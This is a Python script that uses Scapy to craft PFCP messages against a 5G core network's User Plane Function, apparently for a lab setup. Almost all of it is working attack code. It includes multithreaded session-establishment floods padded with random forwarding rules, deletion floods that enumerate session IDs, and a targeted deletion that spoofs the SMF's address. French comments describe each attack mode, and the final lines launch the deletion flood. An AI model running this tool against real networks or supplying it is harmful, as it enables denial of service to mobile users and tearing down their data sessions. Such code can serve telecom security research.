from scapy.all import send, sr1, IP, UDP, conf
from scapy.contrib.pfcp import *
import time, random, ipaddress, threading


import sys

conf.verb = 0

EVIL_ADDR = "10.100.200.66" 
UPF_ADDR  = "10.100.200.2"
SPOOFED_SMF_ADDR = "10.100.200.8"
DEST_PORT = 8805
SRC_PORT = 8805
seq=1

class Ez_PFCP:
    def __init__(self, src_addr, dest_addr, src_port=8805, dest_port=8805, verbose=False):
        self.src_addr = src_addr
        self.dest_addr = dest_addr
        self.src_port = src_port
        self.dest_port = dest_port
        self.seq = 1
        self.verbose = verbose
        self.seid=None
        
        
        if verbose:
            print("[EZ-PFCP] Verbose mode enabled")
        
        
        
    def new_seq(self, randomize=False):
        if randomize:
            seqNbr = random.randint(1, 0xFFFFFFFF)
            return seqNbr
        seq = self.seq
        self.seq += 1
        if self.seq > 0xFFFFFFFF:
            self.seq = 1
        return seq
    
    
    def Random_create_far(self):
        return IE_CreateFAR(
            IE_list=[
                IE_FAR_Id(id=random.randint(1, 255)),
                IE_ApplyAction(FORW=1),
                IE_OuterHeaderCreation(
                    GTPUUDPIPV4=1, 
                    TEID=random.randint(1, 0xFFFFFFFF),
                    ipv4=".".join(str(random.randint(1, 254)) for _ in range(4)),
                    port=2152
                )
            ]
        )
    
    def Build_PFCP_association_setup_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None):
        src_addr = src_addr or self.src_addr
        dest_addr = dest_addr or self.dest_addr
        src_port = src_port or self.src_port
        dest_port = dest_port or self.dest_port
        seq = self.new_seq()
        
        # Trick to bypass scapy's bad parsing
        node_id = Raw(bytes(IE_NodeId(id_type=0, ipv4=src_addr)))
        recovery_timestamp = Raw(bytes(IE_RecoveryTimeStamp(
            timestamp=int(time.time())
        )))
        pfcp_msg = PFCP(
            version=1,
            message_type=5,
            seid=0,
            S=0,
            seq=seq
        )/node_id/recovery_timestamp

        packet = IP(src=src_addr, dst=dest_addr)/UDP(sport=src_port, dport=dest_port)/pfcp_msg
        packet = packet.__class__(bytes(packet))
        return packet
    
    def Build_PFCP_session_establishment_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None,
                                            seid=0x1, ue_addr=None, teid=0x11111111, precedence=255, interface=1, random_seq=False, random_far_number=0):
        src_addr = src_addr or self.src_addr
        dest_addr = dest_addr or self.dest_addr
        src_port = src_port or self.src_port
        dest_port = dest_port or self.dest_port
        seid = seid or self.seid
        seq = self.new_seq(randomize=random_seq)
        
        
        
        ie_nodeid = Raw(bytes(IE_NodeId(id_type=0, ipv4=src_addr)))
        ie_fseid = Raw(bytes(IE_FSEID(seid=seid, v4=1, ipv4=src_addr)))

        ie_createpdr = Raw(bytes(IE_CreatePDR(IE_list=[
            IE_PDR_Id(id=1),
            IE_Precedence(precedence=precedence),
            IE_PDI(IE_list=[
                IE_SourceInterface(interface=interface),
                
                IE_FTEID(TEID=teid, V4=1, ipv4=ue_addr)
            ]),
            IE_FAR_Id(id=1)
        ])))

        ie_createfar = Raw(bytes(IE_CreateFAR(IE_list=[
            
            IE_FAR_Id(id=1),
            IE_ApplyAction(FORW=1),
            IE_OuterHeaderCreation(
                GTPUUDPIPV4=1, 
                TEID=teid, 
                ipv4=ue_addr, 
                port=2152
                )
        ])))

        pfcp_msg = PFCP(
            version=1,
            message_type=50,
            seid=0,
            S=1,
            seq=seq
        ) / ie_nodeid / ie_fseid / ie_createpdr / ie_createfar
        
        if random_far_number:
            for i in range(random_far_number):
                pfcp_msg = pfcp_msg / Raw(bytes(self.Random_create_far()))

        pkt = IP(src=src_addr, dst=dest_addr) / UDP(sport=src_port, dport=dest_port) / pfcp_msg
        pkt = pkt.__class__(bytes(pkt))  # Recalcul final
        return pkt


    def Build_PFCP_session_deletion_req(self, seid=None, src_addr=None, dest_addr=None, src_port=None, dest_port=None):

        seid = seid or self.seid
        src_addr = src_addr or self.src_addr
        dest_addr = dest_addr or self.dest_addr
        src_port = src_port or self.src_port
        dest_port = dest_port or self.dest_port
        

        if src_addr is None:
            print("[EZ-PFCP] No source address provided for PFCP session deletion request")
            return
        if self.verbose:
            print(f"[EZ-PFCP] Sending PFCP session deletion packet to {dest_addr} with SEID {seid}")
        

        
        node_id = Raw(bytes(IE_NodeId(id_type=0, ipv4=src_addr)))

        pfcp_msg = PFCP(
            version=1,
            message_type=54,
            seid=seid,
            S=1,
            seq=1
        ) / node_id
        packet = IP(src=src_addr, dst=dest_addr) / UDP(sport=src_port, dport=dest_port) / pfcp_msg
        packet = packet.__class__(bytes(packet))
        return packet
    

    
    


    def Send_PFCP_association_setup_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None):
        src_addr = src_addr or self.src_addr
        dest_addr = dest_addr or self.dest_addr
        src_port = src_port or self.src_port
        dest_port = dest_port or self.dest_port
        seq = self.new_seq()
        
        if src_addr is None:
            print("[EZ-PFCP] Error: No source address provided. Expected a valid IPv4 address (e.g., '192.168.1.1').")
            return
        if src_port is None:
            print("[EZ-PFCP] Error: No source port provided. Expected a valid port number (e.g., 8805).")
            return
        if dest_addr is None:
            print("[EZ-PFCP] Error: No destination address provided. Expected a valid IPv4 address (e.g., '192.168.1.2').")
            return
        if dest_port is None:
            print("[EZ-PFCP] Error: No destination port provided. Expected a valid port number (e.g., 8805).")
            return


        
        pfcp_association_setup_req = self.Build_PFCP_association_setup_req(
            src_addr=src_addr,
            dest_addr=dest_addr,
            src_port=src_port,
            dest_port=dest_port
        )
        send(pfcp_association_setup_req)
        if self.verbose:
            print(f"[EZ-PFCP] PFCP Association Setup packet sent")
            
            
    def Send_PFCP_session_establishment_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None,
                                            seid=0x1, ue_addr=None, teid=0x11111111, precedence=255, interface=1, random_seq=False, random_far_number=0):
        src_addr = src_addr or self.src_addr
        dest_addr = dest_addr or self.dest_addr
        src_port = src_port or self.src_port
        dest_port = dest_port or self.dest_port
        seid = seid or self.seid
        seq = self.new_seq(randomize=random_seq)
        
        if src_addr is None:
            print("[EZ-PFCP] Error: No source address provided. Expected a valid IPv4 address (e.g., '192.168.1.1').")
            return
        if src_port is None:
            print("[EZ-PFCP] Error: No source port provided. Expected a valid port number (e.g., 8805).")
            return
        if dest_addr is None:
            print("[EZ-PFCP] Error: No destination address provided. Expected a valid IPv4 address (e.g., '192.168.1.2').")
            return
        if dest_port is None:
            print("[EZ-PFCP] Error: No destination port provided. Expected a valid port number (e.g., 8805).")
            return
        if ue_addr is None:
            print("[EZ-PFCP] Error: No UE address provided. Expected a valid IPv4 address (e.g., '10.0.0.1').")
            return

        
        if self.verbose:
            print(f"[EZ-PFCP] Sending PFCP session establishment request to {dest_addr} with SEID {seid}, UE address {ue_addr}, TEID {teid}, precedence {precedence}, interface {interface}")
        
        
        
        pfcp_session_establishment_req = self.Build_PFCP_session_establishment_req(
            src_addr=src_addr,
            dest_addr=dest_addr,
            src_port=src_port,
            dest_port=dest_port,
            seid=seid,
            ue_addr=ue_addr,
            teid=teid,
            precedence=precedence,
            interface=interface,
            random_seq=random_seq,
            random_far_number=random_far_number
        )
        send(pfcp_session_establishment_req)
        if self.verbose:
            print(f"[EZ-PFCP] PFCP Session Establishment packet sent")

    def Send_PFCP_session_deletion_req(self, seid, src_addr=None, dest_addr=None, src_port=None, dest_port=None, turbo=False):
        
        src_addr = src_addr or self.src_addr
        dest_addr = dest_addr or self.dest_addr
        src_port = src_port or self.src_port
        dest_port = dest_port or self.dest_port
        seq=self.new_seq()
        if seid is None:
            print("[EZ-PFCP] Error: No SEID provided. Expected a valid SEID (e.g., 0xC0FFEE).")
            return
        if src_addr is None:
            print("[EZ-PFCP] Error: No source address provided. Expected a valid IPv4 address (e.g., '192.168.1.1').")
            return
        if dest_addr is None:
            print("[EZ-PFCP] Error: No destination address provided. Expected a valid IPv4 address (e.g., '192.168.1.2').")
            return 
        if src_port is None:
            print("[EZ-PFCP] Error: No source port provided. Expected a valid port number (e.g., 8805).")
            return
        if dest_port is None:
            print("[EZ-PFCP] Error: No destination port provided. Expected a valid port number (e.g., 8805).")
            return

        req = self.Build_PFCP_session_deletion_req(
                seid=seid,
                src_addr=src_addr,
                dest_addr=dest_addr,
                src_port=src_port,
                dest_port=dest_port
            )
        if turbo:
            send(req)
            return
        
        res = sr1(req)
        if not res:
            print("[EZ-PFCP] No response received for PFCP session deletion request")
        
        pfcp_cause = None
        
        for ie in res[PFCP].IE_list:
            if isinstance(ie, IE_Cause):
                pfcp_cause = ie.cause
                break
        if self.verbose:
            print(f"[EZ-PFCP] PFCP Session Deletion response received with cause: {pfcp_cause}")
        return pfcp_cause
        
        

        
        
        
        
        
        
        
        
        
        




class PFCPDosAttack:
    def __init__(self, evil_addr, upf_addr, src_port, dest_port, ue_start_addr="1.1.1.1", verbose=False, prepare=False, randomize=False, random_far_number=15, smf_addr=None):
        self.evil_addr = evil_addr
        self.upf_addr = upf_addr
        self.src_port = src_port
        self.dest_port = dest_port
        self.seq = 1
        self.seid_counter = 1
        self.teid_counter = 1
        self.ue_base_addr = ipaddress.IPv4Address(ue_start_addr)
        self._ue_counter = 1
        self.pfcp_association_packet= None
        self.pfcp_establishment_packet_list = []
        self.verbose = verbose
        self.prepare = prepare
        self.randomize = randomize
        self.lock = threading.Lock()
        self.random_far_number = random_far_number
        
        self.smf_addr = smf_addr
        self.SESSION_CONTEXT_NOT_FOUND = 65
        self.REQUEST_ACCEPTED = 1
        
    def set_random_far_number(self, random_far_number=15):
        self.random_far_number = random_far_number
        if not self.verbose : return
        if random_far_number:
            print(f"[DoS] Random FAR number set to {random_far_number}")

    def set_randomize(self, randomize=True):
        self.randomize = randomize
        if not self.verbose : return
        if randomize:
            print("[DoS] Randomize mode enabled")
        else:
            print("[DoS] Randomize mode disabled")
    
    def set_prepare(self, prepare=True):
        self.prepare = prepare
        if not self.verbose : return
        if prepare:
            print("[DoS] Prepare mode enabled")
        else:
            print("[DoS] Prepare mode disabled")
    
    def set_verbose(self, verbose=True):
        self.verbose = verbose
        if verbose:
            print("[DoS] Verbose mode enabled")
        else:
            print("[DoS]Verbose mode disabled")
    
    def new_ue_addr(self, randomize=False):
        if self.randomize or randomize:
            return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

        next_ip = self.ue_base_addr + self._ue_counter
        self._ue_counter += 1
        return str(next_ip)
    
    def new_seq(self, randomize=False):
        if self.randomize or randomize:
            seqNbr = random.randint(1, 0xFFFFFFFF)
            return seqNbr
        
        with self.lock:
            seq = self.seq
            self.seq += 1
            if self.seq > 0xFFFFFFFF:
                self.seq = 1
            return seq
    
    def new_seid(self, randomize=False):
        if self.randomize or randomize:
            self.seid = random.randint(1, 0xFFFFFFFFFFFFFFFF)
            return self.seid
        
        seid = self.seid_counter
        self.seid_counter += 1
        if self.seid_counter > 0xFFFFFFFFFFFFFFFF:
            self.seid_counter = 1
        return seid
    
    def new_teid(self, randomize=False):
        if self.randomize or randomize:
            self.teid = random.randint(1, 0xFFFFFFFF)
            return self.teid
        
        teid = self.teid_counter
        self.teid_counter += 1
        if self.teid_counter > 0xFFFFFFFF:
            self.teid_counter = 1
        return teid
    

    
    def prepare_pfcp_session_establishment_flood(self, count):
        print(f"[DoS] Preparing {count} PFCP session establishment packets")
        pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port, verbose=True)
        
        start_time = time.time()
        last_update = start_time
        
        for i in range(count):
            self.pfcp_establishment_packet_list.append(pfcp_obj.Build_PFCP_session_establishment_req(
                seid=self.new_seid(), 
                ue_addr=self.new_ue_addr(),
                teid=self.new_teid(),
                random_seq=self.randomize,
                random_far_number=self.random_far_number
                ))
            
            now = time.time()
            if now - last_update >= 5:
                percent = (i + 1)* 100 // count
                last_update = now
                print(f"[DoS] Progress: {percent}% ({i+1}/{count})")
        print(f"[DoS] Prepared the PFCP association setup packet")
        print(f"[DoS] Prepared {count} PFCP session establishment packets")
    
    def prepare_pfcp_session_deletion_flood(self, count):
        if self.verbose:
            print(f"[DoS] Preparing {count} PFCP session deletion packets")
        print("Hello World")
    
    def pfcp_session_establishment_flood_worker(self, count, start_index=0):
        if self.verbose:
            if self.prepare:
                print(f"[DoS][Worker] Worker starts flooding with {count} requests (offset {start_index})")
            else:
                print(f"[DoS][Worker] Worker starts flooding with {count} requests")
            
            
        
        if self.prepare:
            for i in range(start_index, start_index+count):
                try:
                    send(self.pfcp_establishment_packet_list[i])
                except Exception as e:
                    print(f"[DoS][Worker] Error sending PFCP session establishment packet: {e}")
        else:
            pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port)
            for i in range(count):
                try:
                    pfcp_obj.Send_PFCP_session_establishment_req(
                        seid=self.new_seid(), 
                        ue_addr=self.new_ue_addr(),
                        teid=self.new_teid(),
                        random_seq=self.randomize,
                        random_far_number=self.random_far_number
                    )
                except Exception as e:
                    print(f"[DoS][Worker] Error sending PFCP session establishment request: {e}")
                
            
        if self.verbose:
            print(f"[DoS][Worker] Worker finished flooding with {count} requests")

    def pfcp_session_deletion_flood_worker(self, count, start_index=0):
        if self.verbose:
            print(f"[DoS][Worker] Worker starts flooding with {count} requests (offset {start_index})")
        
        
        pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port)
        for i in range(start_index, start_index+count): 
            try:

                response = pfcp_obj.Send_PFCP_session_deletion_req(seid=i+1)

                    
                if response == self.REQUEST_ACCEPTED:
                    print(f"[DoS][Worker] PFCP session deletion request accepted; SEID: {hex(i+1)}")
                    
            except Exception as e:
                print(f"[DoS][Worker] Error sending PFCP session deletion request: {e}") 
                
    
    def Start_pfcp_session_deletion_flood(self, reqNbr=100, num_threads=1):

        if self.verbose:
            print(f"[DoS] Starting PFCP session deletion flood with {reqNbr} requests and {num_threads} threads")

        threads= []
        per_thread = reqNbr // num_threads
        remaining = reqNbr % num_threads
        pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port, verbose=self.verbose)
        thread_offset = 0
        start_time = time.time()
        for i in range(num_threads):
            count = per_thread + (1 if i < remaining else 0)
            t = threading.Thread(target=self.pfcp_session_deletion_flood_worker, args=(count, thread_offset))
            t.start()
            threads.append(t)
            thread_offset += count
        
        for t in threads:
            t.join()
        if self.verbose:
            print(f"[DoS] PFCP session deletion flood completed")
        end_time = time.time()
        duration = end_time - start_time
        pps = reqNbr / duration if duration > 0 else float("inf")
        print(f"[DoS] Sent {reqNbr} packets in {duration:.2f} seconds ({pps:.2f} pps)")
        
    
    def Start_pfcp_session_establishment_flood(self, reqNbr=100, num_threads=1):
        if self.prepare:
            self.prepare_pfcp_session_establishment_flood(reqNbr)
        
        
        if self.verbose:
            print(f"[DoS] Starting PFCP session establishment flood with {reqNbr} requests and {num_threads} threads")
        
        threads = []
        per_thread = reqNbr // num_threads
        remaining = reqNbr % num_threads

        pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port, verbose=True)
        pfcp_association_packet = pfcp_obj.Build_PFCP_association_setup_req()
        
        start_time = time.time()
        
        try:
            send(pfcp_association_packet)
        except Exception as e:
            print(f"[DoS] Error sending PFCP association packet: {e}")
        
        thread_offset = 0
        for i in range(num_threads):
            count = per_thread + (1 if i < remaining else 0)
            t = threading.Thread(target=self.pfcp_session_establishment_flood_worker, args=(count, thread_offset +1))
            t.start()
            threads.append(t)
            thread_offset += count

        for t in threads:
            t.join()
        end_time = time.time()

        if self.verbose:
            print(f"[DoS] PFCP session establishment flood completed")
        
        duration = end_time - start_time
        pps = reqNbr / duration if duration > 0 else float("inf")
        print(f"[DoS] Sent {reqNbr} packets in {duration:.2f} seconds ({pps:.2f} pps)")
    
    def Start_pfcp_session_deletion_targeted(self, target_seid, smf_addr=None, upf_addr=None, src_port=None, dest_port=None):
        
        upf_addr = upf_addr or self.upf_addr
        smf_addr = smf_addr or self.smf_addr
        src_port = src_port or self.src_port
        dest_port = dest_port or self.dest_port
        
        if upf_addr is None:
            print("[DoS] No UPF address provided for PFCP session deletion")
            return
        if smf_addr == None:
            print("[DoS] No SMF address provided for PFCP session deletion")
            return
        
        if src_port is None:
            print("[DoS] No source port provided for PFCP session deletion")
            return
        if dest_port is None:
            print("[DoS] No destination port provided for PFCP session deletion")
            return
        
            
        if not target_seid:
            print("[DoS] No SEID provided for PFCP session deletion")
            return

        
        
        if self.verbose:
            print(f"[DoS] Sending PFCP session deletion packet to {upf_addr} with SEID {target_seid}")
        
        ez_pfcp_obj = Ez_PFCP(src_addr=smf_addr,
                              dest_addr=upf_addr,
                              src_port=src_port,
                              dest_port=dest_port)
        
        ez_pfcp_obj.Send_PFCP_session_deletion_req(seid=target_seid)
        
        
        if self.verbose:
            print(f"[DoS] PFCP Session Deletion packet sent to {upf_addr}")
        




########## UTILISATION ez_pfcp

# # option 1: (mieux si on veut faire plusieurs requêtes sur le même upf)
# objet_test = Ez_PFCP(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT, verbose=True)
# objet_test.Send_PFCP_association_setup_req()
# objet_test.Send_PFCP_session_establishment_req(seid=0xC0FFEE, ue_addr="1.1.1.1")

# # option 2: (plus modulable)
# Ez_PFCP().Send_PFCP_association_setup_req(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
# Ez_PFCP().Send_PFCP_session_establishment_req(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT, 
#                                               seid=0xC0FFEE, ue_addr="1.1.1.1")



########## UTILISATION PFCPDosAttack

### SESSION ESTABLISHMENT FLOOD ATTACK (DoS)
# objet_dos = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
# objet_dos.set_verbose(True)
# objet_dos.set_randomize(True)

# objet_dos.set_random_far_number(int(sys.argv[3]))
# objet_dos.Start_pfcp_session_establishment_flood(reqNbr=int(sys.argv[1]), num_threads=int(sys.argv[2]))


### SESSION DELETION ATTACK (targeted DoS)
# objet_dos = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
# objet_dos.set_verbose(True)
# objet_dos.Start_pfcp_session_deletion_targeted(smf_addr=sys.argv[1], target_seid=int(sys.argv[2], 0))


### SESSION DELETION ATTACK (DoS)
objet_dos = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
objet_dos.set_verbose(True)
objet_dos.Start_pfcp_session_deletion_flood(reqNbr=int(sys.argv[1]), num_threads=int(sys.argv[2]))
